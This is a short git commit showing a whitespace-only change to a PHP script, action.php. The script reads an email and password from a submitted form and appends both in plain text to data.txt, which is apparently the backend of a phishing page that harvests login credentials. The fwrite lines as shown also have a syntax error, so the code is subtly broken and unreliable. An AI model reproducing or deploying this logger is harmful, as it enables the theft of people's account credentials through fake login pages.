57bcb432237748a2ba6d6f5f0af4e1096c6dbeaf
Typefull <typefull.tarr@gmail.com>
2024-05-28 12:09:26 +0500

    Update action.php

--- action.php
+++ action.php
@@ -3,7 +3,7 @@
 $email = trim($_POST['email']);
 $pass = trim($_POST['pass']);
 
-$fp = fopen('data.txt' , 'a');
+$fp = fopen('data.txt','a');
 fwrite($fp,"email: {$email}"\n);
 fwrite($fp,"pass: {$pass}"\n);
 fwrite($fp,"---------------"\n);
